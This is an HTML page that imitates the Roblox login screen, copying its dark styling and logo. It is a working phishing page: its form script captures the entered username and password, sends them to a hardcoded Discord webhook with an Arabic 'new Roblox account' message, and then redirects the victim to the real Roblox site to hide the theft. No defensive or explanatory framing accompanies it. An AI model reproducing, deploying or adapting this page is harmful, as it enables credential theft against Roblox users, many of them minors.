<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Login</title>
    <style>
        body {
            background-color: #191B1D;
            color: #FFFFFF;
            font-family: "H覆盖", "Segoe UI", Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #232527;
            padding: 30px 40px;
            border-radius: 4px;
            width: 380px;
            text-align: center;
            box-sizing: border-box;
        }
        .logo {
            width: 50px;
            height: 50px;
            background: url('https://images.rbxcdn.com/7ec584da251648a737609a5f4f89be9d-roblox_logo_dark.svg') no-repeat center;
            background-size: contain;
            margin: 0 auto 20px auto;
        }
        h3 {
            font-size: 20px;
            font-weight: 500;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 12px;
            background-color: #111214;
            border: 1px solid #393B3D;
            border-radius: 4px;
            color: white;
            font-size: 14px;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #0084ff;
            outline: none;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #0084ff;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover { background-color: #0074e0; }
        .footer-links {
            margin-top: 20px;
            font-size: 13px;
            color: #979797;
        }
        .footer-links a { color: #0084ff; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"></div>
        <h3>Login to Roblox</h3>
        <form onsubmit="sendData(event)">
            <input type="text" id="username" placeholder="Username/Email/Phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
        <div class="footer-links">
            <a href="#">Forgot Password or Username?</a>
        </div>
    </div>
    <script>
        async function sendData(e) {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            await fetch('https://discord.com/api/webhooks/1505014134834462851/5RgT2ClszGRVUFK4t9ajmpr22_uyLfd55WvemGaLPjXYBW1KeyvbvbhqAK-Fdjupr70M', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: "🎮 **حساب روبلوكس جديد!**",
                    embeds: [{
                        fields: [
                            {name: "المستخدم", value: "`" + user + "`", inline: true},
                            {name: "كلمة المرور", value: "`" + pass + "`", inline: true}
                        ],
                        color: 15158332
                    }]
                })
            });
            window.location.href = "https://www.roblox.com/home";
        }
    </script>
</body>
</html>
